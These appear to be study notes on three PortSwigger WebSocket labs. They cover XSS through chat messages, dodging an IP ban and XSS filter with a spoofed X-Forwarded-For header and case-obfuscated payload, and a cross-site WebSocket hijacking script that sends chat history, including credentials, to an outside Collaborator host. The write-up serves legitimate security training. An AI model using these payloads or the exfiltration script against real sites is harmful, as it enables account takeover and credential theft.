### 1. Lab: Manipulating WebSocket messages to exploit vulnerabilities
> This online shop has a live chat feature implemented using WebSockets.
Chat messages that you submit are viewed by a support agent in real time.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

In this application, there is a chat message section where user will send message and it will be set to UI using `innerHTML`.
![[Pasted image 20250831124749.png]]
So instead of sending "test" we will send XSS payload in order to do alert.
![[Pasted image 20250831124739.png]]Using `<img src=1 onerror='alert(1)'>` we can able to solve the lab.

### 2. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
> This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

A message is sent and captured in Burp’s WebSockets history, then forwarded to Repeater for modification. When a basic XSS payload is injected and sent (`<img src=1 onerror='alert(1)'>`), the system blocks the attack and terminates the WebSocket connection, banning the user’s IP. By spoofing the IP with the `X-Forwarded-For` header in the handshake request, the tester successfully reconnects. Finally, an obfuscated XSS payload is sent to bypass the filter and attempt code execution.
```html
<img src=1 oNeRrOr=alert`1`>
```
![[Pasted image 20250831131448.png]]

### 3. Lab: Cross-site WebSocket hijacking
> This online shop has a live chat feature implemented using WebSockets.
To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

To exploit the WebSocket vulnerability, first open **Live Chat** and send a message, then reload the page. In Burp Suite, observe in the **WebSockets history** tab that the `"READY"` command retrieves past chat messages from the server. In the **HTTP history** tab, locate the WebSocket handshake request and note that it does not contain any CSRF tokens. Copy the handshake request URL and use it in the exploit server by pasting the following payload into the body:
```html
<script>
    var ws = new WebSocket('wss://0ad5004f03d8440d8106b68100090082.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://collaborator.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
After clicking **View exploit**, poll for interactions in the Collaborator tab and confirm that the attack exfiltrates chat history, with each message sent as an HTTP request body in JSON format (though not always in order). Finally, deliver the exploit to the victim via the exploit server and poll Collaborator again to capture the victim’s chat history, which will include their username and password. Use these exfiltrated credentials to log into the victim’s account.